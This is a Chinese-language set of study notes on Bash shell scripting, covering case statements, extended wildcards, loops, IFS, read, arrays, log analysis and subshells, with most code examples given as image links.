![image-20220317142029791](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317142029791.png)

### 2.11实战案例：简单、高效的case语句

![image-20220317142135107](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317142135107.png)

case语句还支持多个条件的匹配，语法格式如下。

![image-20220317142338299](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317142338299.png)

上面的语法中，case命令首先会展开word关键字，然后将该关键字与下面的每个模式进行匹配比较。word关键字展开支持使用～（根目录）、变量展开$、算术运算展开$[]、命令展开$（）等。每个模式匹配中也都支持与word关键字一样的展开功能。一旦case命令发现有匹配的模式，则执行对应命令序列中的命令。如果命令序列的最后使用了；;（双分号），则case命令不再对后续的模式进行匹配比较，即匹配停止。如果使用；&替代；；会导致case继续执行下一个模式匹配中附加的命令序列。如果使用；; &替代；；则会导致case继续对下一个模式进行匹配，如果匹配则执行对应命令序列中的命令。下面通过几个简单的实例学习case语句的基本语法格式。

![image-20220317143005294](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317143005294.png)



![image-20220317143717614](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317143717614.png)

![image-20220317143740175](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317143740175.png)

case命令可以使用管道符号（|）进行多个模式的匹配，编写有些交互脚本时需要使用这个功能。

![image-20220317150426805](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317150426805.png)

注意后面有个)

不然会报错

![image-20220317150500237](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317150500237.png)

### 2.12 编写nginx启动脚本

case语句另一个常用的应用案例是编写CentOS6风格的服务启动脚本，在CentOS7系统中虽然使用systemctl替代了旧版本的service，但在实际生产环境中还是有大量案例需要编写旧版本的service启动脚本，而且CentOS7也向下兼容CentOS6的启动脚本。注意：CentOS6风格的service启动脚本文件必须存放在/etc/init.d/目录下。

![image-20220317153647581](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317153647581.png)

### 2.13 揭秘模式匹配与通配符、扩展通配符

使用case进行模式匹配时，除了一些特殊符号，在模式匹配中出现的任何字符都仅代表其自身。在模式匹配中支持具有特殊含义的字符，通常这些符号被称为通配符，

![image-20220317172152112](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317172152112.png)

下面通过案例看看如何使用通配符识别用户输入的内容。

![image-20220317172412374](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317172412374.png)

![image-20220317172420188](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317172420188.png)

从测试脚本的执行效果可以看出，上面这个脚本仅可以识别一个字符，如果输入的内容的字符数超过一个，则全部被识别为其他特殊符号。而且在使用[A-Z]这样的排序集合时，Shell默认会根据系统的locale字符集排序，如果字符集使用不当，会导致匹配不到任何数据的情况发生，这个结果显然是不太合理的。

![image-20220317172753057](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317172753057.png)

查看字符集

![image-20220317173155836](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317173155836.png)

![image-20220317173312240](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317173312240.png)

可以使用shopt命令切换影响Shell行为的控制选项，如果使用shopt命令将Shell的extglob控制选项开启，则在Shell中可以支持如表2-8所示的扩展通配符。shopt命令用于显示和设置Shell的各种属性，shopt命令不设置任何参数时，可以显示所有Shell属性及属性值。使用shopt命令的-s选项可以激活某个特定的Shell属性功能，而-u选项则可以禁用某个特定的属性功能。

![image-20220317190935035](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317190935035.png)

![image-20220317195632278](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317195632278.png)

shopt #查看所有变量

![image-20220317195734820](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317195734820.png)

通过一个示例演示扩展通配符的作用。脚本需要结合实际执行效果反复验证并思考匹配的流程与原理。

![image-20220317201053646](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317201053646.png)

![image-20220317201320331](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317201320331.png)

从执行结果中可以看出，+这个通配符的作用就是对模式至少进行1次匹配，所以不管输入多少个Y都会匹配成功。Y不区分大小写，因为模式中使用的[Yy]代表集合中的任意单个字符

![image-20220317201742796](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317201742796.png)

使用？通配符仅对模式进行0次或1次匹配（最多1次）。本示例中使用？对大小写的字母N进行匹配，表示N可以出现1次，也可以不出现，但最多出现1次。而后面的字母o是必须有的，没有特殊转义，也没有特殊匹配。所以执行脚本后，输入No、no或o都可以匹配成功，但是输入多于1个n则匹配失败。最终与！（[[:punct:]]）匹配成功，屏幕回显："输入的不是标点符号"。

![image-20220317201831608](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317201831608.png)

使用扩展通配符@可以指定仅对模式进行1次匹配，示例中使用@对数字进行匹配，所以当输入8或其他任意单个数字时都会匹配成功，但是输入任意多个数字则无法匹配成功。

一定要使用shopt命令先将控制变量extglob开启，否则执行脚本时会报错。

## 3根本停不下来的循环和中断控制

### 3.1for循环

![image-20220317202456542](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317202456542.png)

在该基本语法格式中，name是可以任意定义的变量名称，word是支持扩展的项目列表，扩展后生成一份完整的项目列表（或值列表）。name会逐一提取项目列表中的每一个值，每提取一个值就会执行一次do和done中间的命令序列。下面通过几个简单的例子演示for循环语句的基本语法。

![image-20220317202635221](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220317202635221.png)

变量name没有定义取值的范围，这个循环语句到底会循环多少次呢？如果变量name没有定义取值范围，则默认取值为$@，也就是所有位置变量的值。这样有几个位置变量，该for循环语句就循环几次。下面通过一个示例演示效果

![image-20220317202756847](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317202756847.png)

执行for-domo3.sh脚本，因为提供了3个参数，分别是hello、798和beijing，所以当第一次循环时i取值为hello，执行命令echo $i，屏幕回显hello。当第二次循环时i取值为798，执行命令echo $i，屏幕回显798。当第三次循环时i取值为beijing，执行命令echo $i，屏幕回显beijing。

有时候脚本的循环语句需要执行成百上千次，如果每一个值都手动输入，谁也无法接受。Shell支持使用seq或{}自动生成数字序列，并且使用{}还可以自动生成字母序列。for循环语句可以对{}或seq扩展后的数据列表进行循环。

![image-20220317203157172](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220317203157172.png)

上面这条命令从1开始，最大到10，中间的步长是2。1+2=3,3+2=5,5+2=7,7+2=9, 9+2=11，因为11超出了1～10的范围，所以命令的实际最大输出结果为9。

![image-20220317203234644](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317203234644.png)

但是，当在{}中调用其他变量时一定要注意，并不会得到我们想要的数字序列。

![image-20220317203250141](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317203250141.png)

另外，还可以使用seq命令生成数字序列，并且可以调用其他变量，但该命令不支持生成字母序列。默认输出序列的分隔符是\n换行符，也可以使用-s选项自定义分隔符。

![image-20220317203310893](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317203310893.png)

![image-20220317203319629](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317203319629.png)

![image-20220317203340520](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317203340520.png)

![image-20220317203356667](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317203356667.png)

对有序的数字（年份）进行循环并判断其是否为闰年，就是一个不错的练习案例。

![image-20220317205034939](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317205034939.png)

![image-20220317210515728](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317210515728.png)

下面的脚本通过快速生成数字序列，测试某个网段内所有主机的连通性。虽然在Linux系统中可以通过安装Nmap快速测试主机的连通性，但是这些示例却可以帮助我们更好地理解for循环语句。通过大量类似案例的训练，可以为后续其他应用案例打下坚实的基础。![image-20220317211709381](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317211709381.png)

或者使用seq快速生成数字序列。因为seq是一个命令，而此时需要的是命令的执行结果，所以这里需要使用$（）或``对命令进行扩展，获取命令的执行结果。

![image-20220317212334289](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317212334289.png)

Bash Shell除了支持前面的语法格式，还支持C语言风格的for循环语法格式。熟悉C语言的开发者对for（i=1; i＜=6; i++）这种语法格式肯定非常熟悉，但在Shell中需要额外添加一对括号。其基本语法格式如下

![image-20220317212558909](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317212558909.png)

### 3.2实战:猴子香蕉

![image-20220317213556013](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317213556013.png)

![image-20220317213638413](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317213638413.png)

### 3.3 实战案例：进化版HTTP状态监控脚本

2.9节介绍了很多监控HTTP服务的脚本。但是，因为没有使用循环语句，所以检测结果都是以一次判断为依据的。而在实际生产环境中业务可能会发生短暂的健康抖动，从而造成服务处于不可用状态，但实际上服务是没有问题的。抖动的原因很多，如网络的问题、访问量的问题、计算机硬件的问题等。因此可以对服务做多次检测，比如3次检测都不正常，则认定为服务器故障。可以通过循环语句对特定的服务器页面进行多次检测，并设置一个失败次数的计数器，当失败次数等于3时则脚本报警，否则仅通过记录日志的形式记录状态。

![image-20220317214714288](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317214714288.png)



### 3.4 神奇的循环嵌套

画出国际象棋棋盘

根据白色

行和列的求和为偶数

行和列的求和为奇数

![image-20220317222848117](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317222848117.png)

![image-20220317223325475](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220317223325475.png)



### 3.5 非常重要的IFS

在Shell中使用内部变量IFS（Internal Field Seprator）来决定项目列表或值列表的分隔符，IFS的默认值为空格、Tab制表符或换行符。使用for循环读取项目列表或值列表时，就会根据IFS的值判断列表中值的个数，最终决定循环的次数。例如，A="hello theworld"，当使用空格作分隔符时，变量A的值有三列。但是，当使用字母t作为分隔符时，变量A的值就有两列。所以当使用不同的分隔符时读取数据的结果也会有很大差别，这点在编写脚本时一定要注意！IFS的多个值之间是“或”关系，所以for循环在读取列表时，数据可以使用空格分隔，或使用Tab制表符分隔，或使用换行符对数据进行分隔。因为空格、Tab制表符和换行符都属于ASCII码表中的控制字符，是不可显示的内容，所以正常使用echo命令显示该变量的值时，是看不到内容的，但是可以通过od命令将数据转换为八进制数据后再查看。ASCII码表的全部内容较多

![image-20220317224154992](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317224154992.png)

注意，当使用echo命令输出IFS的值时，因为IFS的值是空格或Tab制表符，所以无法显示具体内容。另外，因为IFS的值还可以是一个换行符，所以输出结果可以是一个独立的空白行，而echo命令在输出数据内容后又会自动进行一次换行，所以最后输出两个空白行！如果使用printf命令输出IFS值，就不会有两个空白行的情况发生，因为printf打印完内容后默认不换行。

![image-20220317224256656](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317224256656.png)

不管是使用echo还是printf命令，在输出的结果中都无法显式地查看到具体的内容。但是，可以使用od命令将数据转换为八进制后再查看。

![image-20220317224434862](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317224434862.png)

输出结果中的040是空格键、011是Tab制表符、012是换行符。因为IFS的原始值不容易设置，所以当需要修改IFS值时，最好提前备份其原始值

![image-20220317225728290](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317225728290.png)

观察并分析上面这一组命令的结果可知，因为已经将IFS的值修改为冒号（:），而当通过read命令读取三个变量的值时，如果输入的3个字符是以空格为分隔符的，则系统会认为"a b c"是一个完整的数据，并将其赋值给变量x，这样就导致没有定义变量y和z的值，输出的变量y和z的值就为空。如果希望给x、y、z三个变量都赋值，就需要输入数据时使用冒号分隔数据。

![image-20220317225803505](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317225803505.png)

下面通过一系列的案例，再看看Shell脚本中使用for循环语句读取数据列表时，IFS对脚本又有哪些影响？

![](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD\image-20220317233530136.png)

![image-20220317233639210](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317233639210.png)

就是说只要是；.：中的任何一个都能成为分隔符

![image-20220317235746182](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220317235746182.png)

同样通过read命令读取3个变量的值，如果输入的数字字符之间使用t分隔，则系统会认为1、2和3是三个独立的值，并将这三个值分别赋值给变量x、y和z。最终使用echo命令回显变量值时，x、y和z变量都有正确的值

这也证明了，使用IFS="\t"并不能将特殊的控制字符设置为分隔符。那么，该如何正确地将特殊的控制字符设置为系统默认的分隔符呢？当需要使用表3-2中特殊的控制字符作为分隔符时，必须使用$'string’方式进行设置，否则系统无法正确理解控制字符的含义。![image-20220318000145605](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318000145605.png)

![image-20220318000152879](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318000152879.png)

注意了 必须是‘ 而不是“

### 3.6 实战案例：while循环

![image-20220318175017534](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318175017534.png)

while命令后面的条件判断只要语句命令返回码为0就代表真，否则代表假。并非仅仅可以写[]或[[]]判断，while的判断可以是任何可以执行的命令。比如编写一个实时检测服务进程状态的脚本，当Httpd服务进程启动时脚本进行持续的跟踪检测，而当Httpd服务进程关闭时则循环结束，脚本提示警告信息后退出。

![image-20220318175453222](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318175453222.png)

![image-20220318175522146](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220318175522146.png)

### 3.7死循环

前面的案例多数都是有限次数的循环脚本，但有些脚本则需要死循环执行，通常这种情况都会使用while true或while ：来实现功能。在Shell中，true和：都是固定返回退出码0的空命令，这两个命令都不会进行任何实际的操作。与true相反的另一个命令为false, false命令是一个退出码为非0的空命令。

![image-20220318184344986](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318184344986.png)

### 3.8 实战案例：如何通过read命令读取文件中的数据

首先，回顾并了解read命令的几个特性。

当定义了三个变量，但输入时仅输入一个值时，则后两个变量的值为空。

![image-20220318184723874](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220318184723874.png)

当定义两个变量但输入三个或多个值时，则从第二个值开始及后面的所有值都会被赋值给第二个变量。如果只定义一个变量，那么不管通过键盘输入多少值都会被赋值给变量。

![image-20220318184857336](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318184857336.png)

然后看如何结合while循环批量读取数据并通过read命令给变量赋值，基本格式如下。

![image-20220318185319085](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220318185319085.png)

![image-20220318185327716](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318185327716.png)

开始执行while循环后，read命令会从标准输入或管道中读取数据，如果能读取到数据则执行do和done之间的所有命令，与标准while语句一样，命令执行完后会返回到while语句，继续下一次循环，直到read命令读取文件内容失败，则整个循环结束。下面通过几个简单的案例，学习基本语法格式。为此，需要先创建一个测试性的文本文件。

![image-20220318185914419](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318185914419.png)

![image-20220318190311481](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318190311481.png)

类似的方式，当使用read命令从文件中读取数据并赋值给两个变量时，每一行第一个空格前的内容会赋值给第一个变量，后面的所有内容会赋值给第二个变量。

![image-20220318190556968](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318190556968.png)

但是，如果数据文件的分隔符不是空格怎么办呢？通过read命令如何更好地处理这样的数据呢？可以通过修改IFS变量，实现自定义数据分隔符。下面看一个读取passwd文件的示例。

![image-20220318191558637](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318191558637.png)



![image-20220318191122960](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318191122960.png)

![image-20220318191203172](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318191203172.png)

通过上面的示例，可以顺利地读取/etc/passwd文件中的每行数据。但直接在脚本开始时修改IFS变量的值，会对整个脚本都有影响，如果仅仅希望read命令在读取数据时以冒号为分隔符，同时又不影响其他程序，则可以使用如下的方式完成相同的工作。

![image-20220318191351966](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318191351966.png)

另一种语法格式是使用管道将数据传递给while循环，批量读取数据文件，下面通过一个命令行的案例，学习该语法格式。但需要注意，通常情况下使用重定向导入的方式往往比管道的效率高。

![image-20220318192257901](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318192257901.png)

![image-20220318192022652](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318192022652.png)

df是用来计算磁盘空间占用情况

-h是令1k计算为1000b

上面的命令首先过滤所有以/开始的分区挂载信息，然后将数据通过管道的方式传递给while循环，read命令定义了三个变量，name对应的是磁盘名称，size对应的是磁盘总容量，other对应的是其他所有信息。在while循环体内，通过echo命令输出磁盘设备名称和总容量。

### 3.9 until和select循环

在Shell脚本环境中还有另外两个循环语句，分别是until和select。until实现与while一样的功能，select循环主要用于创建菜单选项。

until语句的语法格式如下。

![image-20220318192448671](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318192448671.png)

与while语句相反，until循环语句只有当条件判断结果为真时才退出循环，而当条件判断结果为假时则执行循环体中的命令。

![image-20220318192758153](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220318192758153.png)

由于until语句与while语句可以实现相同的功能，在生产环境中更多地会使用while语句编写循环脚本，所以这里也仅通过一个简单的示例学习until语句的语法格式即可。

使用select循环的主要目的是方便地创建菜单，其基本语法格式如下。

![image-20220318192921185](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318192921185.png)

下面通过一个查看系统信息的脚本来看select语句的应用示例。

![image-20220318194127585](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318194127585.png)

![image-20220318194216988](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318194216988.png)

### 3.10 中断与退出控制

在执行循环的过程中，有时候并不希望执行完所有的循环命令！比如，如果编写了一个循环脚本，脚本会通过循环逐一访问远程某个网段（如192.168.4.0/24）内的所有主机，并试图将所有主机重启或关机。但是如果执行脚本的这台主机的IP地址也在这个网段内呢？所以，在有些特殊的情况下并不希望完整地执行完所有循环命令。Shell针对循环专门设计了中断与退出语句：continue、break和exit。

![image-20220318200510297](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318200510297.png)

![image-20220318200541570](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318200541570.png)

下面再学习另外一个中断命令break，该命令可以结束整个循环体，break后面的所有语句不再执行，并且整个循环提前结束。如果脚本使用了循环的嵌套功能，则break命令后面可以跟数字参数（数字要求大于或等于1），表示对第几层循环执行中断。下面通过简单示例演示它的功能。

![image-20220318203304022](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318203304022.png)

最后看一个中断级别最高的命令exit，该命令会直接结束整个脚本，exit后面也可以跟数字参数，表示脚本的退出状态，如果没有指定数字参数，则脚本的退出状态就是上一个命令的退出状态。下面通过几个简单示例演示它的功能。

![image-20220318203739911](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318203739911.png)

分析脚本执行结果，与break示例一样，前面两次循环正常输出数字1和2，当循环至第三次i取值为3时，exit命令被触发导致整个脚本结束，虽然循环体中后面还有echo命令，但是后面有再多命令也不会被执行。

![image-20220318203908633](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318203908633.png)

### 3.11 Shell小游戏之机选双色球

双色球彩票投注分为红色球和蓝色球，每注投注号码由6个红色球号码和1个蓝色球号码组成，红色球号码从1～33中选择，蓝色球号码从1～16中选择，投注时不管是红色球还是蓝色球都不允许出现重复的号码。

为了编写这样一个机选双色球的脚本，需要先了解几个技巧。

![image-20220318204649595](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318204649595.png)

通过+=的方式，可以将任意个数的字符追加保存到一个变量中，而机选双色球中的红色球就需要这样的一个变量，在这个变量中保存所有随机的6组红色球号码。

![image-20220318204948920](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318204948920.png)

使用wc命令可以对数据进行统计操作，不同的选项输出的结果不同

![image-20220318205253792](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318205253792.png)

![image-20220318210215531](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318210215531.png)

![image-20220318210242620](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318210242620.png)

## 4请开始你的表演，数组、Subshell与函数

### 4.1数组

shell支持一种特殊的变量——数组。数组是一组数据的集合，数组中的每个数据被称为一个数组元素。目前Bash仅支持一维索引数组和关联数组，Bash对数组大小没有限制。

定义和调用索引数组的基本语法格式如下。

![image-20220318231948731](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318231948731.png)

这里定义了一个变量名称为name的数组，该数组中存储了5组数据，索引（也称为下标）分别为0、1、2、3、8，索引可以是算术表达式，但要求运算的结果是整数。可以通过索引定义数组，同样也可以使用索引获取数组中某个元素的值。注意，数字索引可以是一个变量，索引可以不连续。

![image-20220318232524141](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318232524141.png)

![image-20220318232535221](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318232535221.png)

![image-20220318233202420](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318233202420.png)

因为${name[*]}将所有数组元素视为一个整体，所以for循环仅循环一次就结束，变量i也仅取一次值，i="Jacob Rose Vicky RickTin"。

![image-20220318233302114](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318233302114.png)

因为${name[@]}将所有数组元素视为独立的个体，所以name数组中有多少个元素，for循环就会循环多少次，每循环一次变量i获取其中一个元素的值。

在使用数组时，数组的索引也可以是变量，这个功能Shell脚本中的普通变量是不可能实现的。

![image-20220318233548935](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318233548935.png)

#报错，变量名不能使用变量

![image-20220318233901576](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318233901576.png)



使用第二种方式创建数组与使用第一种方式效果一样。使用第二种方式创建的数组，虽然没有明确指定索引，但系统会默认使用以0为起始值的有序数字为索引。所有数组元素的值之间使用空格符分隔。

![image-20220318234338053](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318234338053.png)

获取数组的所有索引

使用$（）或``也可以将命令的执行结果赋值给数组变量。

![image-20220318234502402](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318234502402.png)

df /

![image-20220318234516183](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220318234516183.png)

删掉标题  直接从第二行开始

![image-20220318234827417](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318234827417.png)

除了可以使用数字作为数组的索引，是否还可以使用其他的字符串作为数组的索引呢？从4.0版本开始Bash为我们提供了一种新的关联数组，使用关联数组，数组的下标可以是任意字符串。关联数组的索引要求具有唯一性，但索引和值可以不一样。

![image-20220318235257935](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220318235257935.png)

![image-20220318235745533](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318235745533.png)

unset A【b】#删除数组中某个袁术

unset A#删除整个数组

虽然可以使用${数组名[@]}或${数组名[*]}一次性获取数组中所有元素的值，但是如何单独将数组中的每个元素值提取出来呢？使用循环可以遍历数组的所有元素的值。



![](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD\image-20220319000513813.png)

![image-20220319000552437](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319000552437.png)

### 4.2 实战案例：斐波那契数列

 斐波那契数列表

![image-20220319151924450](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319151924450.png)

该数列的特点是从第3个数开始，后面的数字等于前面两个数字之和，如1+1=2,1+2=3, 2+3=5,3+5=8…

总结推导公式为：F（n）=F（n-1）+F（n-2）（n＞=3, F（1）=1,F（2）=1）。

另外，该数列当n趋向无穷大时，前一项的值除以后一项的值所得结果无限接近黄金分割比例（0.618）。1/1=1, 1/2=0.5, 2/3=0.666,3/5=0.625, ...,1346 269/2178 309=0.618033 988 75。因此，斐波那契数列也被称为黄金分割数列。

如何使用Shell计算斐波那契数列呢？可以将计算的数字保存到一个数组中，数组的索引就是1,2,3,4等，数组第三个元素的值等于第一个元素和第二个元素值的和，第四个元素的值等于第二个元素和第三个元素值的和。具体代码如下。

![image-20220319153317356](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319153317356.png)

![image-20220319153327895](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319153327895.png)



### 4.3 实战案例：网站日志分析脚本

通常情况下各种业务服务都会产生大量的日志文件，而对日志文件数据进行分析、统计是日常运维工作中非常重要的一个环节。通过对日志文件数据的分析，可以了解业务的运行状态、是否存在潜在的安全威胁、热点数据、时间段趋势、客户来源等信息。

使用数组可以非常方便地对数据进行存储与统计，下面以Nginx的日志文件为例，编写一个访问日志文件的分析脚本。在使用脚本分析日志文件前需要了解Nginx访问日志的内容与格式，Nginx访问日志案例如下。

![image-20220319153447702](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319153447702.png)

在这条日志消息中，172.40.62.167是客户端的IP地址。第二列是一个固定的字符串"-"，没有任何含义。当Nginx配置了用户认证后，客户端访问网站时输入用户名和密码，则第三列的内容为用户名，如果没有配置用户认证则这一列也是固定字符串"-"。第四列方括号内的内容为服务器本地时间（客户端在什么时间访问的服务器）。第五列双引号内的内容包括客户端请求的页面和使用的协议，协议一般为HTTP/1.1或HTTP2.0。第六列为HTTP返回的状态码。第七列是Nginx服务器发送给客户端的字节数（不包括响应头的大小）。第八列告诉服务器客户端是从哪个页面链接访问的，没有通过任何链接访问时这列内容为固定字符串"-"。第九列双引号内的内容是客户端信息，包含客户端使用的操作系统及浏览器等信息。

![image-20220319161605059](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319161605059.png)

![image-20220319161615580](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220319161615580.png)

![image-20220319161628215](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319161628215.png)

![image-20220319161643382](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319161643382.png)

![image-20220319161651158](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319161651158.png)

### 4.4 常犯错误的SubShell

通过当前Shell启动的一个新的子进程或子Shell被称为SubShell（子Shell）。子Shell会自动继承父Shell的很多环境，如变量、工作目录、文件描述符等，但是反之，子Shell中的环境仅在子Shell中有效，父Shell无法读取子Shell的环境。例如，如果在父Shell中定义全局变量，子Shell中就可以调用该变量。但当在子Shell中定义一个局部或全局变量时，父Shell是无法读取该变量的。基于这样的特性，编写的脚本有时就可能出现潜在的问题。

如何生成子Shell呢？使用分组命令符号（）就可以让命令在子Shell中运行，通过Shell变量BASH_SUBSHELL可以查看子Shell的信息，该变量的初始值为0，每启动一个子Shell该变量的值会自动加1，下面通过简单的示例验证效果。

![image-20220319163712157](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319163712157.png)

![image-20220319163721194](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220319163721194.png)

![image-20220319163803838](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319163803838.png)

